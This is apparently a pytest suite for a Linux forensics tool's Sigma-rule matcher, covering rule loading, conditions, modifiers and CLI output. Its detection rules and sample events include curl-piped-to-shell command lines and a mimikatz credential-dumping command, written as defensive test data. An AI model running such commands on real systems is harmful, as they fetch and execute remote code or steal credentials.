"""Sigma subset matching: logsource filter, conditions, Event mapping, CLI wiring.

PyYAML is installed in dev, but every skip-path test forces its absence so
the suite also proves the clean-skip behaviour.
"""

from __future__ import annotations

import json
import sys

import pytest
from conftest import make_mini_evidence

from linuxdfir import cli
from linuxdfir.schema import Event, Severity
from linuxdfir.sigma_scan import (
    RULE,
    load_rules,
    rule_matches,
    scan_with_rules_dir,
)

AUTH_RULE = """\
title: SSH Failed Login As Root
id: test-ssh-root
description: Flags failed root SSH logins.
logsource:
  product: linux
  service: auth
detection:
  selection:
    EventType: ssh_failed_login
    User|contains: root
  condition: selection
level: high
tags:
  - attack.t1110.001
"""

PROC_RULE = """\
title: Curl Piped To Shell
id: test-curl-pipe
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains: curl
    Image|endswith: sh
  condition: selection
level: high
"""

SYSLOG_RULE = """\
title: OOM Killer Fired
id: test-oom
logsource:
  product: linux
  service: syslog
detection:
  selection:
    Message|contains: oom-killer
  condition: selection
level: medium
"""

WINDOWS_RULE = """\
title: Windows Only Rule
id: test-windows
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
  condition: selection
level: medium
"""

AUDIT_MISMATCH_RULE = """\
title: Audit Rule Without Linux Product
id: test-audit-noprod
logsource:
  service: auditd
detection:
  selection:
    Message|contains: exec
  condition: selection
level: low
"""


def _event(**kw) -> Event:
    defaults = dict(
        timestamp_utc=None,
        host="test",
        user=None,
        source_artifact="test",
        event_type="test",
        message="",
        evidence_path="/test",
        line_or_offset=1,
    )
    defaults.update(kw)
    return Event(**defaults)


@pytest.fixture
def rules_dir(tmp_path):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "auth.yml").write_text(AUTH_RULE, encoding="utf-8")
    (rules / "proc.yaml").write_text(PROC_RULE, encoding="utf-8")
    (rules / "notes.txt").write_text("not a rule file\n", encoding="utf-8")
    return rules


@pytest.fixture
def no_yaml(monkeypatch):
    """Force `import yaml` to fail even though PyYAML is installed."""
    monkeypatch.setitem(sys.modules, "yaml", None)


def _auth_events():
    return [
        _event(
            event_type="ssh_failed_login",
            user="root",
            message="Failed password for root from 203.0.113.9 port 51299",
            evidence_path="/var/log/auth.log",
            source_artifact="auth_log",
        ),
        _event(
            event_type="ssh_failed_login",
            user="root",
            message="Failed password for root from 203.0.113.9 port 51300",
            evidence_path="/var/log/auth.log",
            source_artifact="auth_log",
        ),
    ]


def test_auth_rule_matches_and_reports_rule(rules_dir):
    findings, stats = scan_with_rules_dir(_auth_events(), str(rules_dir), {"sigma": {}})
    assert stats["status"] == "ok"
    assert stats["matches"] == 1
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule == RULE
    assert "SSH Failed Login As Root" in finding.title
    assert "test-ssh-root" in finding.title
    assert finding.count == 2
    assert len(finding.refs) == 2
    assert all(ref.evidence_path == "/var/log/auth.log" for ref in finding.refs)
    assert finding.severity == Severity.HIGH
    assert finding.mitre_ids == ["T1110.001"]


def test_proc_rule_matches_audit_exec(rules_dir):
    rules, _ = load_rules(str(rules_dir))
    proc = [r for r in rules if r["id"] == "test-curl-pipe"]
    event = _event(
        event_type="audit_exec",
        message="audit exec pid=42 auid=1000: curl http://example.invalid/x | sh",
        evidence_path="/var/log/audit/audit.log",
        source_artifact="auditd",
    )
    assert rule_matches(proc[0], event) is True
    clean = _event(event_type="audit_exec", message="audit exec pid=7 auid=0: /usr/bin/id")
    assert rule_matches(proc[0], clean) is False


def test_syslog_subset_loads_and_matches(tmp_path):
    rules_dir = tmp_path / "syslog-rules"
    rules_dir.mkdir()
    (rules_dir / "oom.yml").write_text(SYSLOG_RULE, encoding="utf-8")
    rules, info = load_rules(str(rules_dir))
    assert info["rules_loaded"] == 1
    event = _event(event_type="kernel_oom", message="kernel OOM: oom-killer invoked for pid 9")
    assert rule_matches(rules[0], event) is True


def test_logsource_subset_skips_windows_and_non_linux(tmp_path):
    rules_dir = tmp_path / "mixed"
    rules_dir.mkdir()
    (rules_dir / "win.yml").write_text(WINDOWS_RULE, encoding="utf-8")
    (rules_dir / "audit.yml").write_text(AUDIT_MISMATCH_RULE, encoding="utf-8")
    (rules_dir / "auth.yml").write_text(AUTH_RULE, encoding="utf-8")
    rules, info = load_rules(str(rules_dir))
    assert info["rules_loaded"] == 1
    assert info["rules_skipped_logsource"] == 2
    reasons = {entry["file"]: entry["reason"] for entry in info["skipped"]}
    assert "windows" in reasons["win.yml"]
    assert "linux" in reasons["audit.yml"]
    assert [r["id"] for r in rules] == ["test-ssh-root"]
    findings, stats = scan_with_rules_dir(_auth_events(), str(rules_dir), {"sigma": {}})
    assert stats["rules_skipped_logsource"] == 2
    assert stats["matches"] == 1


def test_condition_and_not_filter(tmp_path):
    rules_dir = tmp_path / "cond"
    rules_dir.mkdir()
    (rules_dir / "r.yml").write_text(
        """\
title: Root But Not Benign
id: test-and-not
logsource: {product: linux, service: auth}
detection:
  selection:
    User: root
  filter:
    Message|contains: benign-healthcheck
  condition: selection and not filter
level: medium
""",
        encoding="utf-8",
    )
    rules, _ = load_rules(str(rules_dir))
    bad = _event(user="root", message="Failed password for root")
    assert rule_matches(rules[0], bad) is True
    benign = _event(user="root", message="benign-healthcheck ok")
    assert rule_matches(rules[0], benign) is False


def test_condition_one_of_and_all_of(tmp_path):
    rules_dir = tmp_path / "cond2"
    rules_dir.mkdir()
    (rules_dir / "r.yml").write_text(
        """\
title: Either User
id: test-one-of
logsource: {product: linux, service: auth}
detection:
  sel_root:
    User: root
  sel_alice:
    User: alice
  condition: 1 of sel_*
level: low
""",
        encoding="utf-8",
    )
    (rules_dir / "r2.yml").write_text(
        """\
title: Root Failure Pair
id: test-all-of
logsource: {product: linux, service: auth}
detection:
  s_user:
    User: root
  s_msg:
    Message|contains: Failed
  condition: all of s_*
level: low
""",
        encoding="utf-8",
    )
    rules, _ = load_rules(str(rules_dir))
    by_id = {r["id"]: r for r in rules}
    assert rule_matches(by_id["test-one-of"], _event(user="alice", message="hi")) is True
    assert rule_matches(by_id["test-one-of"], _event(user="bob", message="hi")) is False
    assert rule_matches(by_id["test-all-of"], _event(user="root", message="Failed x")) is True
    assert rule_matches(by_id["test-all-of"], _event(user="root", message="Accepted y")) is False


def test_modifiers_startswith_endswith_re_exact_list(tmp_path):
    rules_dir = tmp_path / "mods"
    rules_dir.mkdir()
    (rules_dir / "r.yml").write_text(
        """\
title: Modifier Coverage
id: test-mods
logsource: {product: linux, category: process_creation}
detection:
  selection:
    CommandLine|startswith: /usr/bin/curl
    Image|endswith: /bash
    Raw|re: 'pipe\\s+to'
    EventType:
      - audit_exec
      - audit_event
  condition: selection
level: medium
""",
        encoding="utf-8",
    )
    rules, _ = load_rules(str(rules_dir))
    event = _event(
        event_type="audit_exec",
        message="/usr/bin/curl http://x | /bin/bash",
        raw="pipe  to shell",
    )
    assert rule_matches(rules[0], event) is True
    wrong_type = _event(event_type="audit_auth", message="/usr/bin/curl x | /bin/bash", raw="pipe  to shell")
    assert rule_matches(rules[0], wrong_type) is False
    wrong_start = _event(event_type="audit_exec", message="curl http://x | /bin/bash", raw="pipe  to shell")
    assert rule_matches(rules[0], wrong_start) is False


def test_case_insensitive_exact_but_sensitive_re(tmp_path):
    rules_dir = tmp_path / "case"
    rules_dir.mkdir()
    (rules_dir / "r.yml").write_text(
        """\
title: Case Rules
id: test-case
logsource: {product: linux, service: auth}
detection:
  sel_exact:
    User: ROOT
  sel_re:
    Message|re: '^Failed'
  condition: sel_exact and sel_re
level: low
""",
        encoding="utf-8",
    )
    rules, _ = load_rules(str(rules_dir))
    assert rule_matches(rules[0], _event(user="root", message="Failed login")) is True
    assert rule_matches(rules[0], _event(user="root", message="failed login")) is False


def test_unknown_field_is_load_error(tmp_path):
    rules_dir = tmp_path / "badfield"
    rules_dir.mkdir()
    (rules_dir / "r.yml").write_text(
        """\
title: Bad Field
id: test-bad-field
logsource: {product: linux, service: auth}
detection:
  selection:
    Frobnicator: x
  condition: selection
level: low
""",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="unsupported Sigma field"):
        load_rules(str(rules_dir))


def test_unknown_modifier_and_bad_regex_are_load_errors(tmp_path):
    for name, body in (
        ("mod", "User|fuzzy: root"),
        ("regex", "Message|re: '([unclosed'"),
    ):
        rules_dir = tmp_path / f"bad-{name}"
        rules_dir.mkdir()
        (rules_dir / "r.yml").write_text(
            f"""\
title: Bad {name}
id: test-bad-{name}
logsource: {{product: linux, service: auth}}
detection:
  selection:
    {body}
  condition: selection
level: low
""",
            encoding="utf-8",
        )
        with pytest.raises(ValueError, match="unsupported Sigma modifier|invalid regex"):
            load_rules(str(rules_dir))


def test_malformed_yaml_missing_detection_empty_dir_are_errors(tmp_path):
    bad_yaml = tmp_path / "badyaml"
    bad_yaml.mkdir()
    (bad_yaml / "r.yml").write_text("{unclosed: [bracket\n", encoding="utf-8")
    with pytest.raises(ValueError, match="cannot parse Sigma rule"):
        load_rules(str(bad_yaml))

    no_detection = tmp_path / "nodetect"
    no_detection.mkdir()
    (no_detection / "r.yml").write_text(
        "title: No Detection\nid: x\nlogsource: {product: linux, service: auth}\nlevel: low\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="non-empty detection"):
        load_rules(str(no_detection))

    empty = tmp_path / "empty"
    empty.mkdir()
    with pytest.raises(ValueError, match="no Sigma rules"):
        load_rules(str(empty))


def test_unknown_condition_reference_is_error(tmp_path):
    rules_dir = tmp_path / "badref"
    rules_dir.mkdir()
    (rules_dir / "r.yml").write_text(
        """\
title: Bad Ref
id: test-bad-ref
logsource: {product: linux, service: auth}
detection:
  selection:
    User: root
  condition: selection and nosuch
level: low
""",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="unknown selection"):
        load_rules(str(rules_dir))


def test_skipped_cleanly_without_yaml(no_yaml, rules_dir):
    events = _auth_events()
    findings, stats = scan_with_rules_dir(events, str(rules_dir), {"sigma": {}})
    assert findings == []
    assert stats["status"] == "skipped"
    assert "pip install" in stats["reason"]
    assert stats["events_scanned"] == 0


def test_scan_sigma_cli_skips_without_yaml(no_yaml, rules_dir, tmp_path, capsys):
    events = tmp_path / "events.jsonl"
    events.write_text(
        json.dumps(
            {
                "source_artifact": "auth_log",
                "event_type": "ssh_failed_login",
                "message": "Failed password for root",
                "evidence_path": "/var/log/auth.log",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    out = tmp_path / "sigma-out"
    assert cli.main(["scan-sigma", str(events), "--rules", str(rules_dir), "-o", str(out)]) == 0
    assert "skipped" in capsys.readouterr().out
    report = json.loads((out / "sigma_findings.json").read_text(encoding="utf-8"))
    assert report["status"] == "skipped"
    assert report["findings"] == []


def test_scan_sigma_cli_writes_report(rules_dir, tmp_path):
    events = tmp_path / "events.jsonl"
    events.write_text(
        "\n".join(
            json.dumps(e)
            for e in [
                {
                    "source_artifact": "auth_log",
                    "event_type": "ssh_failed_login",
                    "message": "Failed password for root from 203.0.113.9",
                    "evidence_path": "/var/log/auth.log",
                    "user": "root",
                },
                {
                    "source_artifact": "syslog",
                    "event_type": "syslog_message",
                    "message": "hello",
                    "evidence_path": "/var/log/syslog",
                },
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    out = tmp_path / "sigma-out"
    assert cli.main(["scan-sigma", str(events), "--rules", str(rules_dir), "-o", str(out)]) == 0
    report = json.loads((out / "sigma_findings.json").read_text(encoding="utf-8"))
    assert report["status"] == "ok"
    assert report["rules_files"] == ["auth.yml", "proc.yaml"]
    assert len(report["findings"]) == 1
    hit = report["findings"][0]
    assert hit["rule"] == RULE
    assert "test-ssh-root" in hit["title"]
    assert hit["refs"][0]["evidence_path"] == "/var/log/auth.log"


def test_scan_sigma_cli_rules_error(tmp_path, capsys):
    events = tmp_path / "events.jsonl"
    events.write_text(
        json.dumps(
            {
                "source_artifact": "auth_log",
                "event_type": "ssh_failed_login",
                "message": "x",
                "evidence_path": "/var/log/auth.log",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    empty = tmp_path / "empty-rules"
    empty.mkdir()
    assert cli.main(["scan-sigma", str(events), "--rules", str(empty)]) == 1
    assert "no Sigma rules" in capsys.readouterr().err


def test_detect_merges_sigma_findings(rules_dir, tmp_path):
    events = tmp_path / "events.jsonl"
    events.write_text(
        json.dumps(
            {
                "source_artifact": "auth_log",
                "event_type": "ssh_failed_login",
                "message": "Failed password for root from 203.0.113.9",
                "evidence_path": "/var/log/auth.log",
                "user": "root",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    out = tmp_path / "detect-out"
    assert cli.main(["detect", str(events), "-o", str(out), "--sigma-rules", str(rules_dir)]) == 0
    findings = json.loads((out / "findings.json").read_text(encoding="utf-8"))
    sigma_hits = [f for f in findings if f["rule"] == RULE]
    assert len(sigma_hits) == 1
    assert "test-ssh-root" in sigma_hits[0]["title"]


def test_run_merges_sigma_findings(tmp_path):
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()
    (rules_dir / "auth.yml").write_text(AUTH_RULE, encoding="utf-8")
    root = make_mini_evidence(
        tmp_path / "mini",
        files={
            "/var/log/auth.log": (
                b"Oct 12 03:10:22 web01 sshd[2101]: Failed password for root "
                b"from 203.0.113.5 port 51299 ssh2\n"
            ),
        },
    )
    out = tmp_path / "run-out"
    assert cli.main(["run", str(root), "-o", str(out), "--sigma-rules", str(rules_dir)]) == 0
    findings = json.loads((out / "findings.json").read_text(encoding="utf-8"))
    sigma_hits = [f for f in findings if f["rule"] == RULE]
    assert len(sigma_hits) == 1
    assert "test-ssh-root" in sigma_hits[0]["title"]
    assert sigma_hits[0]["refs"][0]["evidence_path"] == "/var/log/auth.log"


def test_run_without_sigma_unchanged(tmp_path):
    root = make_mini_evidence(
        tmp_path / "mini",
        files={"/var/log/auth.log": b"Oct 12 03:10:22 web01 sshd[2101]: note\n"},
    )
    out = tmp_path / "run-plain"
    assert cli.main(["run", str(root), "-o", str(out)]) == 0
    findings = json.loads((out / "findings.json").read_text(encoding="utf-8"))
    assert all(f["rule"] != RULE for f in findings)


def test_level_and_tags_mapping(tmp_path):
    rules_dir = tmp_path / "levels"
    rules_dir.mkdir()
    (rules_dir / "r.yml").write_text(
        """\
title: Critical Exec
id: test-critical
logsource: {product: linux, category: process_creation}
detection:
  selection:
    CommandLine|contains: mimikatz
  condition: selection
level: critical
tags:
  - attack.t1003.008
  - attack.credential-access
""",
        encoding="utf-8",
    )
    rules, _ = load_rules(str(rules_dir))
    event = _event(event_type="audit_exec", message="mimikatz sekurlsa::logonpasswords")
    findings, _ = scan_with_rules_dir([event], str(rules_dir), {"sigma": {}})
    assert len(findings) == 1
    assert findings[0].severity == Severity.CRITICAL
    assert findings[0].mitre_ids == ["T1003.008"]

    norule_level = tmp_path / "nolevel"
    norule_level.mkdir()
    (norule_level / "r.yml").write_text(
        """\
title: No Level
id: test-no-level
logsource: {product: linux, category: process_creation}
detection:
  selection:
    CommandLine|contains: mimikatz
  condition: selection
""",
        encoding="utf-8",
    )
    findings, _ = scan_with_rules_dir([event], str(norule_level), {"sigma": {"severity": "low"}})
    assert findings[0].severity == Severity.LOW


def test_no_match_is_empty(rules_dir):
    event = _event(event_type="syslog_message", message="all quiet", user="alice")
    findings, stats = scan_with_rules_dir([event], str(rules_dir), {"sigma": {}})
    assert findings == []
    assert stats["status"] == "ok"
    assert stats["matches"] == 0
